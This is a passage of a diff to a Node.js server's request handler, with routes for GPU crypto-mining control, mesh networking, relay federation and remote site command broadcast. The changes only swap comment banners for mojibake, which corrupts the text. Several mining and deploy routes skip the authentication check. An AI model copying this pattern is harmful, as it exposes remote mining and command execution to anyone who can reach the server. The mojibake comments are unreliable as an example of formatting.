+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/deploy/rpi-script Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/deploy/rpi-script') {
       var shPath = path.join(__dirname, '..', 'deploy', 'rpi', 'setup-rpi.sh');
       try {
@@ -4417,11 +4477,11 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 404, { error: 'setup-rpi.sh not found' }); }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // GPU Mining & Algorithm Switching
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/gpu/detect â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/gpu/detect Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/gpu/detect') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
@@ -4429,7 +4489,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { gpus: gpus });
     }
 
-    // â•â•â• GET /api/gpu/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/gpu/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/gpu/status') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
@@ -4441,7 +4501,7 @@ async function handleRequest(req, res) {
       return json(res, 200, status);
     }
 
-    // â•â•â• POST /api/gpu/start â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/gpu/start Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/gpu/start') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
@@ -4450,14 +4510,14 @@ async function handleRequest(req, res) {
       return json(res, result.ok ? 200 : 400, result);
     }
 
-    // â•â•â• POST /api/gpu/stop â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/gpu/stop Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/gpu/stop') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
       return json(res, 200, _refs.gpuMiner.stopGPU());
     }
 
-    // â•â•â• GET /api/algo/profitability â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/algo/profitability Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/algo/profitability') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
@@ -4465,14 +4525,14 @@ async function handleRequest(req, res) {
       return json(res, 200, { profitability: results });
     }
 
-    // â•â•â• GET /api/algo/current â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/algo/current Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/algo/current') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
       return json(res, 200, _refs.gpuMiner.getAlgoStats());
     }
 
-    // â•â•â• POST /api/algo/switch â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/algo/switch Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/algo/switch') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
@@ -4481,7 +4541,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.gpuMiner.switchAlgo(body.algo));
     }
 
-    // â•â•â• POST /api/algo/auto-switch â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/algo/auto-switch Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/algo/auto-switch') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
@@ -4489,7 +4549,7 @@ async function handleRequest(req, res) {
       return json(res, 200, _refs.gpuMiner.setAutoSwitch(body.enabled, body.intervalMinutes));
     }
 
-    // â•â•â• POST /api/algo/broadcast â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/algo/broadcast Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/algo/broadcast') {
       try { var GpuMiner = require('./gpu-miner'); } catch(e) { return json(res, 404, { error: 'Module not available' }); }
       if (!_refs.gpuMiner) _refs.gpuMiner = new GpuMiner({ workerName: _refs.config.workerName || 'aries' });
@@ -4498,25 +4558,25 @@ async function handleRequest(req, res) {
       return json(res, 200, result);
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Mesh Network
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/mesh/topology â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/mesh/topology Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/mesh/topology') {
       var mesh = _refs.meshNetwork;
       if (!mesh) return json(res, 200, { gateway: null, peers: [], self: null });
       return json(res, 200, mesh.getTopology());
     }
 
-    // â•â•â• GET /api/mesh/stats â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/mesh/stats Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/mesh/stats') {
       var mesh = _refs.meshNetwork;
       if (!mesh) return json(res, 200, { role: 'none', peers: 0, messagesRelayed: 0, bytesRelayed: 0, uptime: 0, gatewayIp: null, queueSize: 0 });
       return json(res, 200, mesh.getStats());
     }
 
-    // â•â•â• POST /api/mesh/re-elect â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/mesh/re-elect Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/mesh/re-elect') {
       var mesh = _refs.meshNetwork;
       if (!mesh) return json(res, 400, { error: 'Mesh not initialized' });
@@ -4524,18 +4584,18 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: true, message: 'Re-election triggered' });
     }
 
-    // â•â•â• GET /api/mesh/peers â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/mesh/peers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/mesh/peers') {
       var mesh = _refs.meshNetwork;
       if (!mesh) return json(res, 200, { peers: [] });
       return json(res, 200, { peers: mesh.getPeers() });
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Relay Federation
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/federation/status â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/federation/status Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/federation/status') {
       var RelayFederation = require('./relay-federation');
       if (!_refs.relayFederation) _refs.relayFederation = new RelayFederation({ refs: _refs });
@@ -4543,7 +4603,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { relays: fed.listRelays(), sync: fed.getSyncStatus(), failover: fed.getFailoverList() });
     }
 
-    // â•â•â• POST /api/federation/relay â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/federation/relay Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/federation/relay') {
       var body = JSON.parse(await readBody(req));
       var RelayFederation = require('./relay-federation');
@@ -4554,7 +4614,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: true, relay: relay });
     }
 
-    // â•â•â• DELETE /api/federation/relay â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/federation/relay Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath === '/api/federation/relay') {
       var body = JSON.parse(await readBody(req));
       var RelayFederation = require('./relay-federation');
@@ -4565,7 +4625,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: removed });
     }
 
-    // â•â•â• POST /api/federation/sync â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/federation/sync Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/federation/sync') {
       var RelayFederation = require('./relay-federation');
       if (!_refs.relayFederation) _refs.relayFederation = new RelayFederation({ refs: _refs });
@@ -4578,14 +4638,14 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â• GET /api/federation/failover â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/federation/failover Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/federation/failover') {
       var RelayFederation = require('./relay-federation');
       if (!_refs.relayFederation) _refs.relayFederation = new RelayFederation({ refs: _refs });
       return json(res, 200, { failover: _refs.relayFederation.getFailoverList() });
     }
 
-    // â•â•â• POST /api/federation/broadcast â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/federation/broadcast Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/federation/broadcast') {
       var RelayFederation = require('./relay-federation');
       if (!_refs.relayFederation) _refs.relayFederation = new RelayFederation({ refs: _refs });
@@ -4597,7 +4657,7 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â• POST /api/federation/deploy â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/federation/deploy Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/federation/deploy') {
       var body = JSON.parse(await readBody(req));
       var RelayFederation = require('./relay-federation');
@@ -4611,25 +4671,25 @@ async function handleRequest(req, res) {
       }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     // Site Controller System
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
 
-    // â•â•â• GET /api/sites/overview â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sites/overview Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sites/overview') {
       var SiteController = require('./site-controller');
       if (!_refs.siteController) _refs.siteController = new SiteController({ relayUrl: (_refs.config || {}).relayUrl, secret: (_refs.config || {}).secret });
       return json(res, 200, _refs.siteController.getSiteOverview());
     }
 
-    // â•â•â• GET /api/sites/list â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sites/list Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath === '/api/sites/list') {
       var SiteController = require('./site-controller');
       if (!_refs.siteController) _refs.siteController = new SiteController({ relayUrl: (_refs.config || {}).relayUrl, secret: (_refs.config || {}).secret });
       return json(res, 200, { sites: _refs.siteController.listSites() });
     }
 
-    // â•â•â• POST /api/sites/add â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sites/add Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/sites/add') {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var body = await readBody(req);
@@ -4642,7 +4702,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• DELETE /api/sites/:name â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â DELETE /api/sites/:name Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'DELETE' && reqPath.startsWith('/api/sites/') && !reqPath.includes('/command') && !reqPath.includes('/workers')) {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var siteName = decodeURIComponent(reqPath.split('/api/sites/')[1]);
@@ -4652,7 +4712,7 @@ async function handleRequest(req, res) {
       return json(res, 200, { ok: removed });
     }
 
-    // â•â•â• POST /api/sites/:name/command â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sites/:name/command Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath.match(/^\/api\/sites\/[^/]+\/command$/)) {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var siteName = decodeURIComponent(reqPath.split('/api/sites/')[1].replace('/command', ''));
@@ -4666,7 +4726,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/sites/broadcast â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sites/broadcast Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/sites/broadcast') {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var body = await readBody(req);
@@ -4679,7 +4739,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• POST /api/sites/become-controller â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â POST /api/sites/become-controller Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'POST' && reqPath === '/api/sites/become-controller') {
       if (!authenticate(req)) return json(res, 401, { error: 'Unauthorized' });
       var body = await readBody(req);
@@ -4692,7 +4752,7 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â• GET /api/sites/:name/workers â•â•â•
+    // Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â GET /api/sites/:name/workers Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
     if (method === 'GET' && reqPath.match(/^\/api\/sites\/[^/]+\/workers$/)) {
       var siteName = decodeURIComponent(reqPath.split('/api/sites/')[1].replace('/workers', ''));
       var SiteController = require('./site-controller');
@@ -4703,11 +4763,11 @@ async function handleRequest(req, res) {
       } catch (e) { return json(res, 400, { error: e.message }); }
     }
 
-    // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
